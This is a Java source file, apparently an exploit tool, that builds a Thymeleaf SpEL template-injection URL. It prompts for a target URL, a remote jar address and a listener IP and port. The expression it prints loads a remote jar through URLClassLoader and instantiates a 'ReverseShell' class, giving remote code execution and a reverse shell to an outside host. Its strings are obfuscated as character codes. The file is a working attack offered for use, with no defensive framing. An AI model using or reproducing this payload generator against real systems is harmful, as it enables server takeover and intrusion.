import java.util.Scanner;

/**
 * @author threedr3am
 */
public class ThymeleafSpelExp {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println("请输入目标URL：");
        String host = scanner.nextLine();
        System.out.println("请输入下载jar地址：");
        String jarUrl = scanner.nextLine();
        System.out.println("请输入反弹shell接收ip：");
        String ip = scanner.nextLine();
        System.out.println("请输入反弹shell接收port：");
        int port = Integer.parseInt(scanner.nextLine());

        StringBuilder spelBuilder = new StringBuilder()
            .append("__${new java.net.URLClassLoader(new java.net.URL%5B%5D{new java.net.URL(T(String).valueOf(new char%5B%5D {")
            .append(stringToBytesStr(jarUrl))
            .append("}))}).loadClass(T(String).valueOf(new char%5B%5D{")
            .append(stringToBytesStr("ReverseShell"))
            .append("})).getConstructor(T(String), T(Integer)).newInstance(T(String).valueOf(new char%5B%5D {")
            .append(stringToBytesStr(ip))
            .append("}), ")
            .append(port)
            .append(").toString()}__::.x")
            ;
        String spel = spelBuilder.toString();
        System.out.println("SPEL:");
        System.out.println(host+"/"+spel);
    }

    private static String stringToBytesStr(String string) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < string.length(); i++) {
            stringBuilder.append(String.format("%d", (byte)string.charAt(i)));
            if (string.length() - 1 != i) {
                stringBuilder.append(",");
            }
        }
        return stringBuilder.toString();
    }
}
